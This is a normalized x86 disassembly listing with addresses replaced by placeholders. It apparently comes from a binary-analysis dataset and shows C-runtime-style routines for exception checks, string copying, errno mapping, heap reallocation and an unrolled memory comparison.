cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_41c4be
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_41c4d8
mov eax [ ebp + 0xc ]
push r--data
call sub_41a7c0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_414a33
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_41c4a5
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_414a33
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_4161dc
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
inc ecx
inc ecx
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_4161fb
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
push esi
push edi
xor edi edi
cmp edx edi
je r-xdata
call sub_4162ac
push 0x16
pop esi
mov [ eax ] esi
mov ebx [ ebp + 0xc ]
cmp ebx edi
ja r-xdata
mov esi [ ebp + 0x10 ]
cmp esi edi
jne r-xdata
mov ecx edx
xor eax eax
mov [ edx ] ax
jmp r-xdata
xor eax eax
cmp ebx edi
jne r-xdata
dec ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ edx ] ax
call sub_4162ac
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
inc ecx
inc ecx
inc esi
inc esi
cmp ax di
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_4153b1
add esp 0x14
mov eax esi
sub_41626a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_4162d2
mov edi edi
push ebp
mov ebp esp
push esi
call sub_4162bf
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_41626a
pop ecx
mov esi eax
call sub_4162ac
mov [ eax ] esi
pop esi
pop ebp
retn
sub_4162f5
push 0x10
push r--data
call sub_415ff4
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_415170
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_415093
pop ecx
jmp r-xdata
call sub_416039
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_419d41
pop ecx
call sub_4162ac
push 0x4
call sub_419057
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_41908a
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416439
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_419588
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_419d41
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_419869
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_4162ac
call sub_4162ac
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_419d41
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41626a
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_4162ac
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_4162ac
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_41a3c0
push ebx
call sub_41908a
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_4190ba
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41626a
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_41a3c0
push ebx
push [ ebp - 0x20 ]
call sub_4190ba
add esp 0x14
mov eax esi
sub_416510
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_417b10 ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
